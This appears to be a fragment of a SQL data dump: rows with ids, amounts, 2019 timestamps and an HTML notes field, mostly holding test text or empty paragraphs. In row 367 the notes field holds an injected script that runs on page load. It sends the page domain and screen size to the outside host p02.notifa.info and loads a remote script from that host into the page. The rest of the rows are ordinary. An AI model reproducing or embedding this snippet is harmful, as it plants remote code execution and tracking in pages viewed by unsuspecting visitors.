(176,32,18,52,350000,75000,'2019-08-08 04:02:44','2019-08-08 09:17:04',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>test</p></body></html>\n',1,0),
(177,32,18,13,192000,50000,'2019-08-08 04:03:11','2019-08-08 04:03:11',NULL,0,NULL,1,0),
(178,32,18,14,308000,50000,'2019-08-08 04:03:20','2019-08-08 04:03:20',NULL,0,NULL,1,0),
(179,32,18,16,200000,50000,'2019-08-08 04:03:44','2019-08-08 04:03:44',NULL,0,NULL,1,0),
(180,32,18,17,247000,50000,'2019-08-08 04:03:52','2019-08-08 04:03:52',NULL,0,NULL,1,0),
(181,32,18,23,255000,50000,'2019-08-08 04:04:46','2019-08-08 04:04:46',NULL,0,NULL,1,0),
(182,32,18,24,265000,50000,'2019-08-08 04:04:53','2019-08-08 04:04:53',NULL,0,NULL,1,0),
(183,32,18,26,318000,50000,'2019-08-08 04:05:08','2019-08-08 04:05:08',NULL,0,NULL,1,0),
(184,32,18,27,265000,50000,'2019-08-08 04:05:19','2019-08-08 04:05:19',NULL,0,NULL,1,0),
(185,32,18,28,353000,50000,'2019-08-08 04:05:33','2019-08-08 04:05:33',NULL,0,NULL,1,0),
(186,28,14,33,66000,30000,'2019-08-08 04:05:57','2019-08-27 19:56:11',NULL,0,NULL,0,0),
(187,32,18,46,315000,30000,'2019-08-08 04:06:07','2019-08-08 04:06:07',NULL,0,NULL,1,0),
(188,28,14,48,277000,100000,'2019-08-08 04:06:17','2019-08-08 04:06:17',NULL,0,NULL,1,0),
(189,32,18,51,308000,25000,'2019-08-08 04:06:25','2019-08-08 04:06:25',NULL,0,NULL,1,0),
(190,32,18,50,275000,25000,'2019-08-08 04:06:35','2019-08-08 04:06:35',NULL,0,NULL,1,0),
(191,31,17,49,381000,40000,'2019-08-08 05:28:41','2019-08-08 05:28:41',NULL,0,NULL,1,0),
(192,31,17,48,232000,50000,'2019-08-08 05:31:25','2019-08-08 05:31:25',NULL,0,NULL,1,0),
(193,31,17,15,242000,60000,'2019-08-08 05:32:06','2019-08-08 05:32:06',NULL,0,NULL,1,0),
(194,31,17,50,295000,40000,'2019-08-08 05:33:57','2019-08-08 05:33:57',NULL,0,NULL,1,0),
(195,47,33,11,285000,42000,'2019-08-08 08:32:11','2019-08-08 08:32:11',NULL,0,NULL,1,0),
(196,47,33,18,225000,50000,'2019-08-08 08:33:00','2019-08-08 08:33:00',NULL,0,NULL,1,0),
(197,47,33,19,232000,50000,'2019-08-08 08:33:38','2019-08-08 08:33:38',NULL,0,NULL,1,0),
(198,47,33,48,240000,58000,'2019-08-08 08:35:07','2019-08-08 08:35:07',NULL,0,NULL,1,0),
(199,47,33,50,300000,45000,'2019-08-08 08:35:36','2019-08-08 08:35:36',NULL,0,NULL,1,0),
(200,47,33,45,328000,50000,'2019-08-08 08:36:10','2019-08-08 08:36:10',NULL,0,NULL,1,0),
(201,47,33,12,185000,50000,'2019-08-08 08:40:07','2019-08-08 08:40:07',NULL,0,NULL,1,0),
(202,47,33,13,250000,103000,'2019-08-08 08:51:06','2019-08-08 08:51:06',NULL,0,NULL,1,0),
(203,47,33,20,300000,93000,'2019-08-08 08:52:01','2019-08-08 08:52:01',NULL,0,NULL,1,0),
(204,47,33,51,350000,62000,'2019-08-08 08:54:29','2019-08-08 08:54:29',NULL,0,NULL,1,0),
(205,47,33,14,350000,87000,'2019-08-08 08:55:43','2019-08-08 08:55:43',NULL,0,NULL,1,0),
(206,47,33,21,350000,123000,'2019-08-08 08:58:01','2019-08-08 08:58:01',NULL,0,NULL,1,0),
(207,47,33,15,300000,118000,'2019-08-08 09:19:11','2019-08-08 09:19:11',NULL,0,NULL,1,0),
(208,47,33,16,300000,145000,'2019-08-08 09:19:36','2019-08-08 09:19:36',NULL,0,NULL,1,0),
(209,47,33,23,260000,50000,'2019-08-08 09:20:26','2019-08-08 09:20:26',NULL,0,NULL,1,0),
(210,47,33,46,370000,80000,'2019-08-08 09:23:13','2019-08-08 09:23:13',NULL,0,NULL,1,0),
(211,28,14,36,125000,49000,'2019-08-08 09:24:45','2019-08-30 09:38:23',NULL,1,NULL,1,0),
(212,47,33,17,300000,98000,'2019-08-08 09:26:12','2019-08-08 09:26:12',NULL,0,NULL,1,0),
(213,47,33,49,450000,109000,'2019-08-08 09:28:43','2019-08-08 09:28:43',NULL,0,NULL,1,0),
(214,47,33,37,190000,75000,'2019-08-08 09:35:35','2019-08-08 09:35:35',NULL,0,NULL,1,0),
(215,28,14,44,175000,40000,'2019-08-08 10:06:35','2019-08-08 10:06:35',NULL,0,NULL,1,0),
(216,28,14,20,275000,73000,'2019-08-08 10:08:06','2019-08-08 10:08:06',NULL,0,NULL,1,0),
(217,28,14,16,220000,70000,'2019-08-08 10:10:55','2019-08-08 10:10:55',NULL,0,NULL,1,0),
(218,28,14,22,170000,70000,'2019-08-08 10:12:57','2019-08-08 10:12:57',NULL,0,NULL,1,0),
(219,28,14,14,315000,57000,'2019-08-08 10:53:15','2019-08-08 10:53:15',NULL,0,NULL,1,0),
(220,35,21,11,300000,62000,'2019-08-08 12:40:55','2019-08-08 12:40:55',NULL,0,NULL,1,0),
(221,32,18,30,265000,50000,'2019-08-08 15:38:14','2019-08-08 15:38:14',NULL,0,NULL,1,0),
(222,32,18,20,260000,58000,'2019-08-08 15:38:44','2019-08-08 15:38:44',NULL,0,NULL,1,0),
(223,32,18,25,260000,55000,'2019-08-08 15:39:59','2019-08-08 15:39:59',NULL,0,NULL,1,0),
(224,32,18,33,55000,19000,'2019-08-08 15:41:05','2019-08-08 15:41:05',NULL,0,NULL,1,0),
(225,32,18,31,255000,50000,'2019-08-08 15:42:13','2019-08-08 15:42:13',NULL,0,NULL,1,0),
(226,32,18,34,55000,19000,'2019-08-08 15:42:39','2019-08-08 15:42:39',NULL,0,NULL,1,0),
(227,32,18,36,101000,25000,'2019-08-08 15:43:02','2019-08-08 15:43:02',NULL,0,NULL,1,0),
(228,32,18,49,366000,30000,'2019-08-08 15:43:19','2019-08-08 15:43:19',NULL,0,NULL,1,0),
(229,32,18,35,190000,40000,'2019-08-08 15:43:32','2019-08-08 15:43:32',NULL,0,NULL,1,0),
(230,36,22,11,278000,40000,'2019-08-09 00:45:35','2019-08-09 00:45:35',NULL,0,NULL,1,0),
(231,36,22,12,280000,150000,'2019-08-09 00:45:43','2019-08-09 00:45:43',NULL,0,NULL,1,0),
(232,45,31,11,300000,62000,'2019-08-09 04:00:10','2019-08-09 04:10:39',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>7</p></body></html>\n',1,0),
(233,55,35,11,298000,60000,'2019-08-09 04:05:28','2019-08-09 04:05:28',NULL,0,NULL,1,0),
(234,55,35,12,190000,60000,'2019-08-09 04:06:17','2019-08-09 04:06:17',NULL,0,NULL,1,0),
(235,55,35,13,232000,90000,'2019-08-09 04:06:37','2019-08-09 04:06:37',NULL,0,NULL,1,0),
(236,55,35,14,318000,60000,'2019-08-09 04:07:47','2019-08-09 04:07:47',NULL,0,NULL,1,0),
(237,55,35,15,247500,70000,'2019-08-09 04:08:36','2019-08-09 04:08:36',NULL,0,NULL,1,0),
(238,55,35,16,210000,60000,'2019-08-09 04:09:11','2019-08-09 04:09:11',NULL,0,NULL,1,0),
(239,55,35,18,240000,70000,'2019-08-09 04:09:29','2019-08-09 04:09:29',NULL,0,NULL,1,0),
(240,55,35,19,237000,60000,'2019-08-09 04:09:42','2019-08-09 04:09:42',NULL,0,NULL,1,0),
(241,55,35,20,262000,60000,'2019-08-09 04:09:53','2019-08-09 04:09:53',NULL,0,NULL,1,0),
(242,55,35,21,282000,60000,'2019-08-09 04:10:07','2019-08-09 04:10:07',NULL,0,NULL,1,0),
(243,55,35,22,170000,70000,'2019-08-09 04:10:27','2019-08-09 04:10:27',NULL,0,NULL,1,0),
(244,55,35,23,265000,60000,'2019-08-09 04:11:33','2019-08-09 04:11:33',NULL,0,NULL,1,0),
(245,55,35,24,265000,50000,'2019-08-09 04:15:14','2019-08-09 04:15:14',NULL,0,NULL,1,0),
(246,55,35,25,255000,50000,'2019-08-09 04:15:23','2019-08-09 04:15:23',NULL,0,NULL,1,0),
(247,55,35,26,318000,50000,'2019-08-09 04:15:44','2019-08-09 04:15:44',NULL,0,NULL,1,0),
(248,55,35,27,265000,50000,'2019-08-09 04:15:51','2019-08-09 04:15:51',NULL,0,NULL,1,0),
(249,55,35,28,353000,50000,'2019-08-09 04:15:59','2019-08-09 04:15:59',NULL,0,NULL,1,0),
(250,55,35,29,325000,50000,'2019-08-09 04:16:08','2019-08-09 04:16:08',NULL,0,NULL,1,0),
(251,55,35,30,265000,50000,'2019-08-09 04:16:26','2019-08-09 04:16:26',NULL,0,NULL,1,0),
(252,55,35,31,255000,50000,'2019-08-09 04:16:40','2019-08-09 04:16:40',NULL,0,NULL,1,0),
(253,55,35,32,46000,10000,'2019-08-09 04:16:50','2019-08-09 04:16:50',NULL,0,NULL,1,0),
(254,55,35,33,46000,10000,'2019-08-09 04:17:01','2019-08-09 04:17:01',NULL,0,NULL,1,0),
(255,55,35,34,46000,10000,'2019-08-09 04:17:19','2019-08-09 04:17:19',NULL,0,NULL,1,0),
(256,55,35,35,190000,40000,'2019-08-09 04:17:35','2019-08-09 04:17:35',NULL,0,NULL,1,0),
(257,55,35,36,101000,25000,'2019-08-09 04:17:45','2019-08-09 04:17:45',NULL,0,NULL,1,0),
(258,55,35,37,135000,25000,'2019-08-09 04:17:57','2019-08-09 04:17:57',NULL,0,NULL,1,0),
(259,55,35,43,165000,30000,'2019-08-09 04:18:05','2019-08-09 04:18:05',NULL,0,NULL,1,0),
(260,55,35,44,160000,25000,'2019-08-09 04:18:17','2019-08-09 04:18:17',NULL,0,NULL,1,0),
(261,55,35,45,313000,40000,'2019-08-09 04:20:21','2019-08-09 04:20:21',NULL,0,NULL,1,0),
(262,55,35,46,315000,30000,'2019-08-09 04:20:34','2019-08-09 04:20:34',NULL,0,NULL,1,0),
(263,55,35,47,280000,30000,'2019-08-09 04:20:43','2019-08-09 04:20:43',NULL,0,NULL,1,0),
(264,55,35,48,202000,25000,'2019-08-09 04:20:54','2019-08-09 04:20:54',NULL,0,NULL,1,0),
(265,55,35,49,366000,30000,'2019-08-09 04:21:14','2019-08-09 04:21:14',NULL,0,NULL,1,0),
(266,55,35,50,275000,25000,'2019-08-09 04:21:25','2019-08-09 04:21:25',NULL,0,NULL,1,0),
(267,55,35,51,308000,25000,'2019-08-09 04:21:36','2019-08-09 04:21:36',NULL,0,NULL,1,0),
(268,55,35,52,310000,35000,'2019-08-09 04:21:58','2019-08-09 04:21:58',NULL,0,NULL,1,0),
(269,26,12,28,358000,50000,'2019-08-09 05:45:32','2019-08-09 05:45:32',NULL,0,NULL,1,0),
(270,26,12,11,283000,40000,'2019-08-09 05:46:29','2019-08-09 05:46:29',NULL,0,NULL,1,0),
(271,26,12,23,260000,50000,'2019-08-09 05:46:41','2019-08-09 05:46:41',NULL,0,NULL,1,0),
(272,26,12,52,303000,25000,'2019-08-09 05:47:16','2019-08-09 05:47:16',NULL,0,NULL,1,0),
(273,26,12,26,323000,50000,'2019-08-09 05:47:36','2019-08-09 05:47:36',NULL,0,NULL,1,0),
(274,26,12,25,260000,50000,'2019-08-09 05:47:52','2019-08-09 05:47:52',NULL,0,NULL,1,0),
(275,26,12,35,195000,40000,'2019-08-09 05:48:05','2019-08-09 05:48:05',NULL,0,NULL,1,0),
(276,26,12,50,280000,25000,'2019-08-09 05:48:35','2019-08-09 05:48:35',NULL,0,NULL,1,0),
(277,26,12,45,318000,40000,'2019-08-09 05:48:57','2019-08-09 05:48:57',NULL,0,NULL,1,0),
(278,26,12,19,232000,50000,'2019-08-09 05:49:10','2019-08-09 05:49:10',NULL,0,NULL,1,0),
(279,26,12,20,257000,50000,'2019-08-09 05:49:17','2019-08-09 05:49:17',NULL,0,NULL,1,0),
(280,26,12,13,197000,50000,'2019-08-09 05:49:37','2019-08-09 05:49:37',NULL,0,NULL,1,0),
(281,26,12,12,185000,50000,'2019-08-09 05:49:43','2019-08-09 05:49:43',NULL,0,NULL,1,0),
(282,26,12,15,232000,50000,'2019-08-09 05:49:51','2019-08-09 05:49:51',NULL,0,NULL,1,0),
(283,26,12,18,225000,50000,'2019-08-09 05:50:04','2019-08-09 05:50:04',NULL,0,NULL,1,0),
(284,26,12,29,330000,50000,'2019-08-09 05:50:37','2019-08-09 05:50:37',NULL,0,NULL,1,0),
(285,26,12,32,51000,10000,'2019-08-09 05:50:46','2019-08-09 05:50:46',NULL,0,NULL,1,0),
(286,26,12,36,106000,25000,'2019-08-09 05:50:59','2019-08-09 05:50:59',NULL,0,NULL,1,0),
(287,26,12,44,165000,25000,'2019-08-09 05:51:09','2019-08-09 05:51:09',NULL,0,NULL,1,0),
(288,26,12,30,270000,50000,'2019-08-09 05:51:18','2019-08-09 05:51:18',NULL,0,NULL,1,0),
(289,10,2,44,299000,159000,'2019-08-09 06:05:59','2019-08-12 02:38:30',NULL,0,NULL,0,0),
(290,39,25,13,250000,108000,'2019-08-09 12:05:39','2019-08-09 12:05:39',NULL,0,NULL,1,0),
(291,39,25,16,250000,100000,'2019-08-09 12:11:07','2019-08-09 12:11:07',NULL,0,NULL,1,0),
(292,28,14,31,265000,60000,'2019-08-09 14:02:24','2019-08-09 14:02:24',NULL,0,NULL,1,0),
(293,28,14,13,220000,78000,'2019-08-09 14:03:50','2019-08-09 14:03:50',NULL,0,NULL,1,0),
(294,28,14,15,245000,67500,'2019-08-09 14:04:35','2019-08-09 14:04:35',NULL,0,NULL,1,0),
(295,28,14,18,250000,80000,'2019-08-09 14:05:04','2019-08-09 14:05:04',NULL,0,NULL,1,0),
(296,28,14,29,325000,50000,'2019-08-09 14:05:32','2019-08-09 14:05:32',NULL,0,NULL,1,0),
(297,28,14,23,265000,60000,'2019-08-09 14:06:11','2019-08-09 14:06:11',NULL,0,NULL,1,0),
(298,28,14,34,66000,30000,'2019-08-09 14:06:49','2019-08-09 14:06:49',NULL,0,NULL,1,0),
(299,28,14,50,295000,45000,'2019-08-09 14:08:01','2019-08-09 14:08:01',NULL,0,NULL,1,0),
(300,28,14,24,285000,70000,'2019-08-09 14:08:53','2019-08-09 14:08:53',NULL,0,NULL,1,0),
(301,39,25,12,230000,100000,'2019-08-09 14:48:14','2019-08-09 14:48:14',NULL,0,NULL,1,0),
(302,35,21,16,200000,50000,'2019-08-09 15:32:02','2019-08-09 15:32:02',NULL,0,NULL,1,0),
(303,35,21,35,190000,40000,'2019-08-09 15:33:18','2019-08-09 15:33:18',NULL,0,NULL,1,0),
(304,35,21,44,170000,35000,'2019-08-09 15:34:24','2019-08-09 15:34:24',NULL,0,NULL,1,0),
(305,35,21,19,230000,53000,'2019-08-09 15:34:53','2019-08-09 15:34:53',NULL,0,NULL,1,0),
(306,35,21,13,195000,53000,'2019-08-09 15:36:21','2019-08-09 15:36:21',NULL,0,NULL,1,0),
(307,35,21,22,170000,70000,'2019-08-09 15:38:27','2019-08-09 15:38:27',NULL,0,NULL,1,0),
(308,35,21,43,175000,40000,'2019-08-09 15:39:27','2019-08-09 15:39:27',NULL,0,NULL,1,0),
(309,35,21,45,320000,47000,'2019-08-09 15:39:59','2019-08-09 15:39:59',NULL,0,NULL,1,0),
(310,35,21,18,230000,60000,'2019-08-09 15:40:15','2019-08-09 15:40:15',NULL,0,NULL,1,0),
(311,35,21,20,260000,58000,'2019-08-09 15:42:53','2019-08-09 15:42:53',NULL,0,NULL,1,0),
(312,39,25,33,75000,39000,'2019-08-09 15:43:43','2019-08-09 15:43:43',NULL,0,NULL,1,0),
(313,39,25,44,200000,65000,'2019-08-09 15:46:21','2019-08-09 15:46:21',NULL,0,NULL,1,0),
(314,39,25,35,225000,75000,'2019-08-09 15:49:22','2019-08-09 15:49:22',NULL,0,NULL,1,0),
(315,35,21,12,190000,60000,'2019-08-09 15:58:55','2019-08-09 15:58:55',NULL,0,NULL,1,0),
(316,35,21,26,325000,57000,'2019-08-09 15:59:13','2019-08-09 15:59:13',NULL,0,NULL,1,0),
(317,35,21,46,325000,40000,'2019-08-09 15:59:31','2019-08-09 15:59:31',NULL,0,NULL,1,0),
(318,49,34,12,180000,50000,'2019-08-11 07:54:33','2019-08-11 07:54:33',NULL,0,NULL,1,0),
(319,49,34,20,252000,50000,'2019-08-11 07:56:09','2019-08-11 07:56:09',NULL,0,NULL,1,0),
(320,49,34,45,313000,40000,'2019-08-11 08:59:01','2019-08-11 08:59:01',NULL,0,NULL,1,0),
(321,47,33,22,200000,95000,'2019-08-12 02:04:30','2019-08-12 02:04:30',NULL,0,NULL,1,0),
(322,47,33,24,300000,80000,'2019-08-12 07:03:53','2019-08-12 07:03:53',NULL,0,NULL,1,0),
(323,47,33,26,350000,50000,'2019-08-12 07:04:15','2019-08-12 07:04:15',NULL,0,NULL,1,0),
(324,47,33,29,380000,50000,'2019-08-12 07:04:48','2019-08-12 07:04:48',NULL,0,NULL,1,0),
(325,47,33,30,300000,80000,'2019-08-12 07:05:24','2019-08-12 07:05:24',NULL,0,NULL,1,0),
(326,16,5,14,308000,50000,'2019-08-12 07:52:10','2019-08-12 07:52:10',NULL,0,NULL,1,0),
(327,16,5,15,230000,52500,'2019-08-12 07:52:31','2019-08-12 07:52:31',NULL,0,NULL,1,0),
(328,16,5,16,230000,80000,'2019-08-12 07:52:53','2019-08-12 07:52:53',NULL,0,NULL,1,0),
(329,16,5,17,257000,60000,'2019-08-12 07:53:24','2019-08-12 07:53:24',NULL,0,NULL,1,0),
(330,16,5,18,220000,50000,'2019-08-12 07:53:38','2019-08-12 07:53:38',NULL,0,NULL,1,0),
(331,16,5,52,325000,50000,'2019-08-12 07:54:17','2019-08-12 07:54:17',NULL,0,NULL,1,0),
(332,16,5,25,255000,50000,'2019-08-12 07:54:40','2019-08-12 07:54:40',NULL,0,NULL,1,0),
(333,16,5,30,265000,50000,'2019-08-12 07:54:53','2019-08-12 07:54:53',NULL,0,NULL,1,0),
(334,16,5,36,116000,40000,'2019-08-12 07:55:37','2019-08-12 07:55:37',NULL,0,NULL,1,0),
(335,16,5,22,150000,50000,'2019-08-12 07:55:50','2019-08-12 07:55:50',NULL,0,NULL,1,0),
(336,16,5,21,272000,50000,'2019-08-12 07:55:57','2019-08-12 07:55:57',NULL,0,NULL,1,0),
(337,16,5,26,318000,50000,'2019-08-12 07:56:23','2019-08-12 07:56:23',NULL,0,NULL,1,0),
(338,16,5,20,252000,50000,'2019-08-12 07:56:38','2019-08-12 07:56:38',NULL,0,NULL,1,0),
(339,16,5,19,227000,50000,'2019-08-12 07:56:47','2019-08-12 07:56:47',NULL,0,NULL,1,0),
(340,16,5,23,255000,50000,'2019-08-12 07:56:55','2019-08-12 07:56:55',NULL,0,NULL,1,0),
(341,16,5,24,265000,50000,'2019-08-12 07:57:03','2019-08-12 07:57:03',NULL,0,NULL,1,0),
(342,16,5,28,353000,50000,'2019-08-12 07:57:14','2019-08-12 07:57:14',NULL,0,NULL,1,0),
(343,16,5,29,325000,50000,'2019-08-12 07:57:27','2019-08-12 07:57:27',NULL,0,NULL,1,0),
(344,16,5,33,56000,20000,'2019-08-12 07:58:20','2019-08-12 07:58:20',NULL,0,NULL,1,0),
(345,16,5,34,53000,10000,'2019-08-12 07:58:54','2019-08-12 07:58:54',NULL,0,NULL,1,0),
(346,16,5,32,51000,15000,'2019-08-12 08:01:35','2019-08-12 08:01:35',NULL,0,NULL,1,0),
(347,16,5,31,255000,50000,'2019-08-12 08:01:45','2019-08-12 08:01:45',NULL,0,NULL,1,0),
(348,16,5,35,198000,48000,'2019-08-12 08:02:25','2019-08-12 08:02:25',NULL,0,NULL,1,0),
(349,16,5,37,145000,35000,'2019-08-12 08:03:05','2019-08-12 08:03:05',NULL,0,NULL,1,0),
(350,16,5,43,185000,50000,'2019-08-12 08:03:43','2019-08-12 08:03:43',NULL,0,NULL,1,0),
(351,16,5,44,170000,35000,'2019-08-12 08:05:52','2019-08-12 08:05:52',NULL,0,NULL,1,0),
(352,16,5,45,323000,50000,'2019-08-12 08:06:08','2019-08-12 08:06:08',NULL,0,NULL,1,0),
(353,16,5,46,325000,40000,'2019-08-12 08:07:25','2019-08-12 08:07:25',NULL,0,NULL,1,0),
(354,16,5,47,292000,42000,'2019-08-12 08:08:11','2019-08-12 08:08:11',NULL,0,NULL,1,0),
(355,16,5,48,222000,45000,'2019-08-12 08:09:00','2019-08-12 08:09:00',NULL,0,NULL,1,0),
(356,16,5,49,386000,50000,'2019-08-12 08:09:34','2019-08-12 08:09:34',NULL,0,NULL,1,0),
(357,16,5,50,295000,45000,'2019-08-12 08:10:53','2019-08-12 08:10:53',NULL,0,NULL,1,0),
(358,16,5,51,338000,55000,'2019-08-12 08:11:14','2019-08-12 08:11:14',NULL,0,NULL,1,0),
(367,15,4,11,298000,60000,'2019-08-13 02:18:16','2019-08-16 10:00:49',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><strong>asdfasdfasdfasdfasdf</strong></p>\n<script type=\"text/javascript\">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol==\"https:\" ? \"https://\" : \"http://\");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ \"p02.notifa.info/3fsmd3/request\" + \"?id=1\" + \"&enc=9UwkxLgY9\" + \"&Acirc;&para;ms=\" + \"4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2BPg%2fdWQJgPeeIf1eLctXl1AiFGV9LPAILNsr80NJgZIy1G9NJtcBF1TOmzwjGGjCrPz%2bu2rUXYSTsHwe9O9C%2bWS6PIrQimE3mCYpOydHI%2bWUjQ13Zn7h2QbIjDxtVC3UpAtNDOIdH9BD%2fvlrzAGUjye4S%2bHd0HBbdZANuH%2bBxF2S%2b89NC6XToE4kqSETVaXSpg4Uu9IHWtM9eGSGyIFVyrChai%2fuznszmLNZvPAPNZ%2bK3Pg3xGscmeILw4%2bIC2ScSjhRj2fORxnaxend99RsqMgSN0gf9f3wq9Taojz9BO%2bHWs4NuZJANsabRxqD4gjGMel8n7L1gsBjHEJHtPNX89hug1WceXY7%2b5bIXOhSyy4nwEr%2fbOoxjZWoQirxibrig9IDMvSLF5OFtoa%2bHAcdYwJCfaPzwa8tVrkplUQtCWgATdtmdVxkyFsolaEDDt8KlRTz5v6Q4Ei%2fqH8WASF08jqWKsTXIxz8PvgAPEykK1f56k8%2b54B4xncGOo1nRnrDaWPX225djlbcCZ57wC%2bkNg%3d%3d\" + \"&idc_r=\"+idc_glo_r + \"&domain=\"+document.domain + \"&sw=\"+screen.width+\"&sh=\"+screen.height;var bsa = document.createElement(\'script\');bsa.type = \'text/javascript\';bsa.async = true;bsa.src = url;(document.getElementsByTagName(\'head\')[0]||document.getElementsByTagName(\'body\')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>\n',1,0),
(368,15,4,12,180000,50000,'2019-08-13 02:19:21','2019-08-13 02:30:06',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>test</p></body></html>\n',1,0),
(369,46,32,11,300000,62000,'2019-08-13 10:14:37','2019-08-13 10:14:37',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',1,0),
(370,46,32,20,295000,93000,'2019-08-13 10:16:22','2019-08-13 10:16:22',NULL,0,'<p><br></p>',1,0),
(371,37,23,15,285500,108000,'2019-08-13 10:16:39','2019-08-13 10:17:50',NULL,0,'<p><br></p>',0,0),
(372,37,23,16,260000,110000,'2019-08-13 10:17:04','2019-08-13 10:20:15',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><strong>sadasdaswd</strong></p></body></html>\n',1,0),
(373,46,32,12,330000,200000,'2019-08-13 10:17:56','2019-08-13 10:17:56',NULL,0,'<p><br></p>',1,0),
(374,46,32,13,255000,113000,'2019-08-13 10:18:12','2019-08-13 10:18:12',NULL,0,'<p><br></p>',1,0),
(375,46,32,14,345000,87000,'2019-08-13 10:18:30','2019-08-13 10:18:30',NULL,0,'<p><br></p>',1,0),
(376,46,32,15,315000,137500,'2019-08-13 10:18:41','2019-08-13 10:18:41',NULL,0,'<p><br></p>',1,0),
(377,46,32,16,235000,85000,'2019-08-13 10:18:55','2019-08-13 10:18:55',NULL,0,'<p><br></p>',1,0),
(378,46,32,17,375000,178000,'2019-08-13 10:19:10','2019-08-13 10:19:10',NULL,0,'<p><br></p>',1,0),
(379,46,32,18,265000,95000,'2019-08-13 10:19:23','2019-08-13 10:19:23',NULL,0,'<p><br></p>',1,0),
(380,46,32,19,277000,100000,'2019-08-13 10:19:37','2019-08-13 10:19:37',NULL,0,'<p><br></p>',1,0),
(381,46,32,21,322000,100000,'2019-08-13 10:20:11','2019-08-13 10:20:11',NULL,0,'<p><br></p>',1,0),
(382,46,32,22,195000,95000,'2019-08-13 10:20:28','2019-08-13 10:20:28',NULL,0,'<p><br></p>',1,0),
(383,46,32,23,255000,50000,'2019-08-13 10:20:45','2019-08-13 10:20:45',NULL,0,'<p><br></p>',1,0),
(384,46,32,24,265000,50000,'2019-08-13 10:20:55','2019-08-13 10:20:55',NULL,0,'<p><br></p>',1,0),
(385,46,32,25,255000,50000,'2019-08-13 10:21:05','2019-08-13 10:21:05',NULL,0,'<p><br></p>',1,0),
(386,46,32,26,318000,50000,'2019-08-13 10:21:19','2019-08-13 10:21:19',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(387,46,32,27,265000,50000,'2019-08-13 10:21:29','2019-08-13 10:21:29',NULL,0,'<p><br></p>',1,0),
(388,46,32,29,325000,50000,'2019-08-13 10:21:50','2019-08-13 10:21:50',NULL,0,'<p><br></p>',1,0),
(389,46,32,30,265000,50000,'2019-08-13 10:22:06','2019-08-13 10:22:06',NULL,0,'<p><br></p>',1,0),
(390,46,32,31,255000,50000,'2019-08-13 10:22:18','2019-08-13 10:22:18',NULL,0,'<p><br></p>',1,0),
(391,46,32,28,353000,50000,'2019-08-13 10:22:26','2019-08-13 10:22:26',NULL,0,'<p><br></p>',1,0),
(392,46,32,32,46000,10000,'2019-08-13 10:22:35','2019-08-13 10:22:35',NULL,0,'<p><br></p>',1,0),
(393,46,32,33,70000,34000,'2019-08-13 10:22:51','2019-08-13 10:22:51',NULL,0,'<p><br></p>',1,0),
(394,46,32,34,65000,29000,'2019-08-13 10:23:05','2019-08-13 10:23:05',NULL,0,'<p><br></p>',1,0),
(395,46,32,35,225000,75000,'2019-08-13 10:23:21','2019-08-13 10:23:21',NULL,0,'<p><br></p>',1,0),
(396,46,32,36,120000,44000,'2019-08-13 10:23:37','2019-08-13 10:23:37',NULL,0,'<p><br></p>',1,0),
(397,46,32,37,135000,25000,'2019-08-13 10:23:48','2019-08-13 10:23:48',NULL,0,'<p><br></p>',1,0),
(398,46,32,43,165000,30000,'2019-08-13 10:23:59','2019-08-13 10:23:59',NULL,0,'<p><br></p>',1,0),
(399,46,32,44,190000,55000,'2019-08-13 10:24:17','2019-08-13 10:24:17',NULL,0,'<p><br></p>',1,0),
(400,32,18,45,313000,40000,'2019-08-13 13:43:36','2019-08-13 13:43:36',NULL,0,'<p><br></p>',1,0),
(401,32,18,44,160000,25000,'2019-08-13 13:43:53','2019-08-13 13:43:53',NULL,0,'<p><br></p>',1,0),
(402,28,14,37,145000,35000,'2019-08-13 13:53:53','2019-08-13 13:53:53',NULL,0,'<p><br></p>',1,0),
(403,31,17,36,114000,33000,'2019-08-14 03:50:09','2019-08-14 03:50:09',NULL,0,'<p><br></p>',1,0),
(404,31,17,16,220000,65000,'2019-08-14 03:50:57','2019-08-14 03:50:57',NULL,0,'<p><br></p>',1,0),
(405,46,32,45,375000,102000,'2019-08-14 05:11:17','2019-08-14 05:11:17',NULL,0,'<p><br></p>',1,0),
(406,46,32,46,322000,37000,'2019-08-14 05:11:35','2019-08-14 05:11:35',NULL,0,'<p><br></p>',1,0),
(407,46,32,47,310000,60000,'2019-08-14 05:11:57','2019-08-14 05:11:57',NULL,0,'<p><br></p>',1,0),
(408,46,32,48,242000,65000,'2019-08-14 05:12:14','2019-08-14 05:12:14',NULL,0,'<p><br></p>',1,0),
(409,46,32,49,397000,61000,'2019-08-14 05:13:07','2019-08-14 05:13:07',NULL,0,'<p><br></p>',1,0),
(410,46,32,50,312000,62000,'2019-08-14 05:13:28','2019-08-14 05:13:28',NULL,0,'<p><br></p>',1,0),
(411,46,32,51,352000,69000,'2019-08-14 05:13:44','2019-08-14 05:13:44',NULL,0,'<p><br></p>',1,0),
(412,46,32,52,365000,90000,'2019-08-14 05:14:05','2019-08-14 05:14:05',NULL,0,'<p><br></p>',1,0),
(413,15,4,13,202000,60000,'2019-08-16 03:06:25','2019-08-16 03:07:44',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>-</p></body></html>\n',1,0),
(414,15,4,14,318000,60000,'2019-08-16 03:06:54','2019-08-16 03:06:54',NULL,0,'<p><br></p>',1,0),
